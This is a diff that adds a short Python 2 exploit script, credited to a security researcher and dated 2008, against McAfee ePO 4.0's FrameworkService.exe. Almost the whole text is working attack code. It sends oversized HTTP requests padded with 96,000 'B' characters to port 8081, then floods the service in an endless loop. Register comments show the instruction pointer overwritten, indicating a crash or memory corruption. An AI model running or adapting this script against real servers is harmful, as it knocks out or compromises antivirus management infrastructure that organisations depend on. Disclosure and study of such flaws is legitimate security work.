@@ -1,0 +1,75 @@
+#!/usr/bin/python
+# Mcafee EPO 4.0 (and others) FrameworkService.exe DOS
+# More than meets the eye
+# Discovered and coded by Mati Aharoni
+# muts..at..offensive-security.com
+# http://www.offensive-security.com/0day/mcafee_again.py.txt
+
+
+# EAX 00840C30
+# ECX 00837830
+# EDX 01EACF18
+# EBX 00004000
+# ESP 01EAFF04
+# EBP 01EAFF38
+# ESI 00837830
+# EDI 643AC780 naCmnLib.CnaLogger::AddMessageA
+# EIP 42424242
+
+import socket
+import os
+import sys
+from time import sleep
+
+expl = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
+expl.connect ( ( sys.argv[1], 8081 ) )
+buff="B"*96000+" HTTP/1.1\r\n"
+req= buff+ "+'/spin//AVClient//AVClient.csp HTTP/1.1\r\nHost: 192.168.1.10:20\r\n\r\n\r\n"
+expl.send (req)
+#data=expl.recv(1024)
+#print data
+expl.close()
+
+expl = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
+expl.connect ( ( sys.argv[1], 8081 ) )
+buff="B"*96000+" HTTP/1.1\r\n"
+req= buff+ "+'/spin//AVClient//AVClient.csp HTTP/1.1\r\nHost: 192.168.1.10:20\r\n\r\n\r\n"
+expl.send (req)
+#data=expl.recv(1024)
+#print data
+expl.close()
+
+expl = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
+expl.connect ( ( sys.argv[1], 8081 ) )
+buff="B"*96000+" HTTP/1.1\r\n"
+req= buff+ "+'/spin//AVClient//AVClient.csp HTTP/1.1\r\nHost: 192.168.1.10:20\r\n\r\n\r\n"
+expl.send (req)
+#data=expl.recv(1024)
+#print data
+expl.close()
+
+while 1:
+
+	expl = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
+	expl.connect ( ( sys.argv[1], 8081 ) )
+	buff="B"*243
+	req= buff +' /spin//AVClient//AVClient.csp HTTP/1.1\r\nHost: 192.168.1.10:20\r\nUser-Agent: Mozilla/4.0 (Linux 2.6.21.5) Java/1.5.0_02\r\n\r\n'
+	expl.send (req)
+	expl.send (req)
+	expl.send (req)
+	expl.send (req)
+	expl.send (req)
+	expl.send (req)
+	expl.send (req)
+	expl.send (req)
+	expl.send (req)
+	expl.send (req)
+	expl.send (req)
+	expl.send (req)
+	data=expl.recv(1024)
+	print data
+	expl.close()
+
+	sleep(0.1)
+
+# milw0rm.com [2008-04-02]
